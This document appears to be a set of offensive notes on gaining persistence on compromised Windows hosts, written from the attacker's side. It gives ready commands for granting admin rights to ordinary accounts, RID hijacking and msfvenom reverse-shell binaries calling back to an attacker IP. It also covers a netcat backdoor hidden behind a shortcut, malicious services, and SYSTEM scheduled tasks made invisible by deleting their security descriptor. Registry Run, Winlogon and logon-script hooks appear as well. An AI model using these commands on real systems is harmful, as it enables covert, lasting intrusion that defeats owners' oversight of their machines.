---
title: Windows local-persistence notes
---

- [1. Resources](#1-resources)
- [2. Assign privileges to unprivileged user](#2-assign-privileges-to-unprivileged-user)
  - [2.1. Group memberships](#21-group-memberships)
  - [2.2. Without group memberships](#22-without-group-memberships)
  - [2.3. RID Hijacking](#23-rid-hijacking)
- [3. Backdooring files](#3-backdooring-files)
  - [3.1. Executables](#31-executables)
  - [3.2. Shortcuts](#32-shortcuts)
  - [3.3. File associations hijacking](#33-file-associations-hijacking)
- [4. Services](#4-services)
  - [4.1. Create a malicious service](#41-create-a-malicious-service)
  - [4.2. Modifying existing service](#42-modifying-existing-service)
- [5. Scheduled tasks](#5-scheduled-tasks)
- [6. Logon triggered](#6-logon-triggered)
  - [6.1. Startup folder](#61-startup-folder)
  - [6.2. Registry (Run \&\& RunOnce)](#62-registry-run--runonce)
  - [6.3. Winlogon](#63-winlogon)
  - [6.4. Logon script](#64-logon-script)

## 1. Resources

- [Payload All The Things - Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)

## 2. Assign privileges to unprivileged user
An attacker, after successfull exploitation, can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges in order to make persistence.

### 2.1. Group memberships
The way to make an unprivileged user access to administrative privileges is to make it part of the _Administrators_ group. This allows an attacker to access the server by using RDP, WinRM or any other remote administration service available.

```powershell
# Add user to the Administrators group
net localgroup Administrators <username> /add
```

This operation might be suspicious but giving RDP or WinRM access only is possible as well:

```powershell
# WinRM access
net localgroup "Remote Management Users" <username> /add

# RDP access
net localgroup "Remote Desktop Users" <username> /add
```

One of the features implemented by UAC (User Account Control) is LocalAccountTokenFilterPolicy. It strips any local account of its administrative privileges when logging in remotely (e.g. by WinRM). To be able to regain admin privileges, an attacker have to disable LocalAccountTokenFilterPolicy changing the registry key:

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

### 2.2. Without group memberships
Group adds some special privileges to all its members. However, these privileges can also be added one-by-one without changing group membership (no suspicious activity). For example, `Backup Operators` group assigns the `SeBackupPrivilege` and the `SeRestorePrivilege` privilege, but they can be assigned also separately without joing to the `Backup Operators` group.

```powershell
# Export current config to a temporary file
secedit /export /cfg config.inf

# In Notepad add your username at the end of the line with a desired privilege

# Convert the .inf into a .sdb file
secedit /import /cfg config.inf /db config.sdb

# Load the new config file into the system
secedit /configure /db config.sdb /cfg config.inf
```

The `Backup Operators` group doesn't allow WinRM connection by default, so it must be set manually (GUI is required).

```powershell
# Show security descriptor panel
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

# Allow 'Full Control (All Operators)' permission to your user
```

### 2.3. RID Hijacking
When a user is created, a **Relative ID** (RID) is assigned to them. It's a numeric identifier representing the user across the system. During the login process, the `LSASS` process associates an access token with the RID of the user. The trick is to change the RID of an unprivileged user (RID >= 1000) into the RID of the `Administrator` (RID = 500).

> **NOTE**: RID is the last part of SID. Example SID (RID = 500): `S-1-5-21-1966530601-3185510712-10604624-500`.

```powershell
# Get SIDs of all users
wmic useraccount get name,sid
```

```powershell
# Run regedit with SYSTEM privileges
PsExec64.exe -i -s regedit
```

## 3. Backdooring files
Using the file access, an attacker can plant backdoors that will get executed whenever the user accesses the backdoored executable. The backdoored files should keep working for the user as expected.

### 3.1. Executables
Using `msfvenom` an attacker can backdoor any executable to work as expected and create a new malicious thread as well. Notice that the executable we want to patch must be downloaded to use `msfvenom` on it.

```bash
msfvenom -a x64 --platform windows -x <EXECUTABLE_TO_PATCH> -k -p windows/x64/shell_reverse_tcp lhost=<ATTACKER_IP> lport=4444 -b "\x00" -f exe -o <OUTPUT_EXE_FILE>
```

### 3.2. Shortcuts
Instead of pointing directly to the expected executable, an attacker can change the shortcut to point to a script that will run a backdoor and then execute the expected software normally.

Example backdoor PS script:

```powershell
# backdoor.ps1
Start-Process -noNewWindow "c:\...\nc64.exe" "-e cmd.exe <ATTACKER_IP> <ATTACKER_PORT>
C:\Windows\...\<executable>.exe
```

Then the shortcut should point to:

```powershell
powershell.exe -WindowStyle hidden <backdoor.ps1-path>
```

### 3.3. File associations hijacking
Modifing the Windows registry an attacker can assign a backdoor script to any file extension. The OS will run a backdoor script whenever the user opens a specific file type.

All extensions are defined in the path `HKLM\Software\Classes\`. In every item there is a `(default)` field with some `data`. The data is called `ProgID` ant it's an identifier of the specific software installed in the OS. Then, the command associate with an ProgID might be found in: `HKLM\Software\Classes\<ProgID>\shell\open\command`. Here, the attacker can replace the original command with the backdoored one - same as with `shortcuts`.

## 4. Services

### 4.1. Create a malicious service
An attacker can create a malicious service which will run a reverse-shell every time the machine is starting.

```bash
# Create a backdoor service executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe-service -o <OUTPUT_FILE_EXE>
```

After transfering the backdoor executable to the victim's machine, create a malicious service:

```powershell
sc.exe create <SERVICE_NAME> binPath= "<PATH_TO_EXE>" start= auto
sc.exe start <SERVICE_NAME>
```

### 4.2. Modifying existing service
Any disabled service is a good candidate to be modified without the user noticing it. The generation of a malicious executable is shown in the previous paragraph.

```powershell
# List of all services
sc.exe query state=all

# Reconfigure service to run a malicious binary
sc.exe config <SERVICE_NAME> binPath= "<PATH_TO_EXE>" start= auto obj= "LocalSystem"

# It might be necessary to start the service
sc.exe start <SERVICE_NAME>
```

## 5. Scheduled tasks
The task scheduler allows for control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or trigger when specific system events occur.

```powershell
# Run the command every single minute (with SYSTEM privileges)
schtasks /create /sc minute /mo 1 /tn <TASK_NAME> /tr "<COMMAND_PAYLOAD>" /ru SYSTEM

# Check if task created successfully
schtasks /query /tn <TASK_NAME>
```

An attacker can make a scheduled task invisible by deleting its _Security Descriptor_ (SD). If a user is not allowed to query a scheduled task, he won't be able to see it anymore. Deleting the SD disallows ALL users to access the scheduled task.

```powershell
# Run regedit as SYSTEM
PsExec64.exe -s -i regedit
```

Remove `SD` item from the `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<TASK_NAME>` location.

## 6. Logon triggered

### 6.1. Startup folder
Each user has a special folder (`C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`) where an attacker can put a executable and it will be run whenever the user logs in. There is also a common folder for all users (`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`).

### 6.2. Registry (Run && RunOnce)
There is also a bunch of registry keys which can be used to specify the command that should be run on every logon.

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The `HKCU` keys apply to the current user. The `HKLM` keys apply to everyone. The `Run` keys execute on every logon. The `RunOnce` keys will be executed only once.

To setup a new task, create a new item under one of these paths. The `name` doesn't matter but the `type` must be set to `REG_EXPAND_SZ`. The `data` is the actual command to be executed.

### 6.3. Winlogon
Winlogon is the Windows component that loads user's profile during the logon process. Under the `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` path there are two items:

- `Userinit` - the command to restore user profile preferences
- `Shell` - the system's shell

An attacker can add a new command (after a comma) to both of these items. Note that removing the default value will break the logon process. These command will be executed during every logon process.

### 6.4. Logon script
There is also a built-in Windows feature to run a logon script. It is set in the registry as well (`HKCU\Environment`). A new item `UserInitMprLogonScript` of the `REG_EXPAND_SZ` type must be created. Its `data` field is the command to be executed. These thing applies to the current user only.
